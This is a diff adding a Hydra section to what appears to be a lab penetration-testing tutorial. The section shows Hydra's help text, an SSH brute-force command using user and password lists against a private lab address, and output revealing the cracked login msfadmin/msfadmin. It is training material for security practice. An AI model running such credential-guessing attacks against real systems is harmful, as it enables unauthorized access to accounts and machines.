@@ -202,7 +202,52 @@ uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(flo
 
 Now we are connected to the target via SSH and can run commands like normal.
 
-
-
-
 ## Hydra
+
+The next tool we will use is Hydra, a powerful login cracker which is very fast and supports a number of different protocols. To show the help and some basic usage options, simply type hydra in the terminal. (Note, if you were previously in the msf console, make sure you cd out of it before using Hydra.)
+```
+~$ hydra
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]
+Options:
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -U        service module usage details
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
+v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
+Don't use in military or secret service organizations, or for illegal purposes.
+Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
+```
+
+Hydra contains a range of options, but today we will be using the following:
+- The -L flag, which specifies a list of login names.
+- The -P flag, which specifies a list of passwords.
+- ssh://172.16.1.102 — our target and protocol.
+- The -t flag set to 4, which sets the number of parallel tasks to run.
+Once we kick it off, the tool will display the status of the attack:
+`~$ hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4`
+```
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-09 15:12:47
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 90 login tries (l:9/p:10), ~23 tries per task
+[DATA] attacking ssh://172.16.1.102:22/
+```
+
+After a period of time, it will complete and show us the number of successful logins found.
+```
+[22][ssh] host: 172.16.1.102   login: msfadmin   password: msfadmin
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 46 to do in 00:02h, 4 active
+[STATUS] 42.00 tries/min, 84 tries in 00:02h, 6 to do in 00:01h, 4 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-09 15:15:10
+```
+
+Hydra's parallel processing power makes it a good choice when a large number of potential credentials are involved.
